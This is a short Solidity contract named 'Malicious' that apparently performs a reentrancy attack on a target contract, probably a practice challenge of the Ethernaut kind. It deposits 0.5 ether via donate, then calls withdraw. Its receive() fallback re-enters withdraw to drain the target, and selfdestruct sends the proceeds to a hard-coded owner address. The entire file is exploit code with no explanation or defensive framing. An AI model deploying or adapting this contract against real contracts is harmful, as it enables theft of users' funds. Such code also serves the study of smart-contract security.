pragma solidity 0.8.0;

contract Malicious {

  address public target;
  address payable public owner;

  constructor(address _destination) payable {
    target = _destination;
    owner = payable(0x61CC1f8d714451778e7A9bcf3dCeA6Dc4d10CB6e);
  }

  function acceptFunds() public payable {}

  function sendbackFunds() public {
    selfdestruct(owner);
  }

  function deposit() public payable {
    (bool success1, ) = target.call{value: 500000000000000000}(abi.encodeWithSignature("donate(address)", address(this)));
    require(success1, "Deposit did not succeed!");
  }

  function withdraw() public {
    (bool success2, ) = target.call(abi.encodeWithSignature("withdraw(uint)", 500000000000000000));
    require(success2, "Withdraw did not succeed!");
  }

  receive() external payable {
    (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint)", 500000000000000000));
    require(success, "Not successful!");
  }
}
